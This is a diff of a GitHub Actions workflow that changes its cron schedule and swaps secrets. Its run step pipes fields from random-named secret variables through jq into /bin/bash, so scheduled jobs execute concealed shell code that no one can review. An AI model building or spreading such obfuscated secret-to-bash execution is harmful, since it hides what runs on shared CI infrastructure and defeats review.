@@ -3,7 +3,8 @@ name: zhenwudadiqiu
 on:
   workflow_dispatch:
   schedule:
-    - cron: '41 2/6 * * *'
+    - cron: '20 5/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,19 +13,13 @@ jobs:
       - uses: actions/checkout@v4
       - name: zhenwudadiqiu
         env:
-          f5: ${{ secrets.f5 }}
+          tstrp5661: ${{ secrets.tstrp5661 }}
         run: |
-          echo $f5 | jq -r .lasyz87 | /bin/bash
-          echo $uiwra56 | jq -r .varov92 | /bin/bash
-          echo $vkrm09666 | jq -r .eil13 | /bin/bash
-          echo $oowqr8 | jq -r .b8 | /bin/bash
-          echo $cwq975 | jq -r .jqojq4506 | /bin/bash
-          echo $c5346 | jq -r .etlk1 | /bin/bash
-          echo $yqwfv8 | jq -r .h67521 | /bin/bash
-          echo $zdkr2 | jq -r .of84991 | /bin/bash
-          echo $pey74170 | jq -r .bob8 | /bin/bash
-          echo $q0473 | jq -r .gtjv32 | /bin/bash
-          echo $s9 | jq -r .hpwr9 | /bin/bash
-          echo $khfi43 | jq -r .ymfg7017 | /bin/bash
-          echo $ulvx71786 | jq -r .qd478 | /bin/bash
+          echo $tstrp5661 | jq -r .gni14157 | /bin/bash
+          echo $nvd5444 | jq -r .d07 | /bin/bash
+          echo $jy91349 | jq -r .iss64370 | /bin/bash
+          echo $lqnhp5547 | jq -r .qhd17625 | /bin/bash
+          echo $isu6770 | jq -r .o6584 | /bin/bash
+          echo $qs840 | jq -r .sfkyv81 | /bin/bash
+          echo $iy020 | jq -r .dpcdg00469 | /bin/bash
 
